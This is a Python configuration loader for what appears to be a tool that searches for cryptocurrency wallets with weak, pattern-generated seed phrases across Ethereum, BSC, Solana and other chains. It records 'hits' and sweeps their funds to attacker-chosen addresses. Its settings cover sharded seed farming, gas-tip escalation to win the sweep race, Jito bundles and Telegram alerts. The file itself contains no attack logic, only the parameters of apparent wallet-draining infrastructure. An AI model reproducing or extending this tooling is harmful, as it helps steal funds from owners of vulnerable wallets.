from __future__ import annotations

import os
from dataclasses import dataclass, field
from pathlib import Path

import yaml
from dotenv import load_dotenv

ROOT = Path(__file__).resolve().parent.parent
load_dotenv(ROOT / ".env")

CHAIN_IDS = {"ethereum": 1, "bsc": 56, "polygon": 137, "base": 8453,
             "arbitrum": 42161, "optimism": 10, "avalanche": 43114, "solana": 0}
ENV = {"ethereum": "RPC_ETH", "bsc": "RPC_BSC", "polygon": "RPC_POLYGON",
       "base": "RPC_BASE", "arbitrum": "RPC_ARBITRUM", "optimism": "RPC_OPTIMISM",
       "avalanche": "RPC_AVAX", "solana": "RPC_SOLANA"}


@dataclass
class Sweep:
    enabled: bool = True
    dry_run: bool = True
    destination_evm: str = ""
    destination_sol: str = ""
    min_gain_ratio: float = 1.6
    min_native_evm: int = 10**15
    min_token_usd_like: int = 500_000
    max_gas_native: int = 3 * 10**16
    jito: bool = True
    rescue: bool = True


@dataclass
class Chain:
    name: str
    id: int
    endpoints: list[str]
    min_native: int
    min_token: int
    is_evm: bool
    router: str = ""
    weth: str = ""


@dataclass
class Settings:
    mode: str = "vulture"
    family: str = "repeat"
    word_pool: int = 128
    shard: int = 0
    shards: int = 4
    per_seed: int = 10
    workers: int = 48
    farm_processes: int = 4
    batch_size: int = 60
    check_tokens: bool = True
    check_security: bool = True
    discover: bool = True
    rpc_timeout: float = 18.0
    max_retries: int = 6
    gas_multiplier: float = 1.4
    tip_gwei: float = 2.0
    tip_escalation: float = 1.125
    escalate_rounds: int = 8
    blast_all: bool = True
    jitter_ms: int = 40
    sweep_reserve_native: int = 3 * 10**14
    chains: list[Chain] = field(default_factory=list)
    sweep: Sweep = field(default_factory=Sweep)
    db_path: Path = ROOT / "data" / "hits.db"
    tg_token: str | None = None
    tg_chat: str | None = None


def load(path=ROOT / "config.yaml") -> Settings:
    raw = yaml.safe_load(Path(path).read_text()) or {}
    chains = []
    for name, cfg in (raw.get("chains") or {}).items():
        if not cfg.get("enabled"):
            continue
        eps = [e for e in (cfg.get("endpoints") or []) if e]
        env = os.getenv(ENV.get(name, ""))
        if env:
            eps.insert(0, env)
        if not eps:
            continue
        chains.append(Chain(name=name, id=CHAIN_IDS.get(name, 1), endpoints=eps,
                            min_native=int(cfg.get("min_native", 1)),
                            min_token=int(cfg.get("min_token", 0)),
                            is_evm=name != "solana",
                            router=cfg.get("router", ""), weth=cfg.get("weth", "")))
    if not chains:
        raise SystemExit("no chains enabled")
    sw = raw.get("sweep") or {}
    return Settings(
        mode=raw.get("mode", "vulture"), family=raw.get("family", "repeat"),
        word_pool=int(raw.get("word_pool", 128)), shard=int(raw.get("shard", 0)),
        shards=int(raw.get("shards", 4)), per_seed=int(raw.get("per_seed", 10)),
        workers=int(raw.get("workers", 48)),
        farm_processes=int(raw.get("farm_processes", 4)),
        batch_size=int(raw.get("batch_size", 60)),
        check_tokens=bool(raw.get("check_tokens", True)),
        check_security=bool(raw.get("check_security", True)),
        discover=bool(raw.get("discover", True)),
        rpc_timeout=float(raw.get("rpc_timeout", 18)),
        max_retries=int(raw.get("max_retries", 6)),
        gas_multiplier=float(raw.get("gas_multiplier", 1.4)),
        tip_gwei=float(raw.get("tip_gwei", 2.0)),
        tip_escalation=float(raw.get("tip_escalation", 1.125)),
        escalate_rounds=int(raw.get("escalate_rounds", 8)),
        blast_all=bool(raw.get("blast_all", True)),
        jitter_ms=int(raw.get("jitter_ms", 40)),
        sweep_reserve_native=int(raw.get("sweep_reserve_native", 3 * 10**14)),
        chains=chains,
        sweep=Sweep(enabled=bool(sw.get("enabled", True)),
                    dry_run=bool(sw.get("dry_run", True)),
                    destination_evm=sw.get("destination_evm", "") or "",
                    destination_sol=sw.get("destination_sol", "") or "",
                    min_gain_ratio=float(sw.get("min_gain_ratio", 1.6)),
                    min_native_evm=int(sw.get("min_native_evm", 10**15)),
                    min_token_usd_like=int(sw.get("min_token_usd_like", 500_000)),
                    max_gas_native=int(sw.get("max_gas_native", 3 * 10**16)),
                    jito=bool(sw.get("jito", True)),
                    rescue=bool(sw.get("rescue", True))),
        db_path=ROOT / "data" / "hits.db",
        tg_token=os.getenv("TELEGRAM_BOT_TOKEN") or None,
        tg_chat=os.getenv("TELEGRAM_CHAT_ID") or None,
    )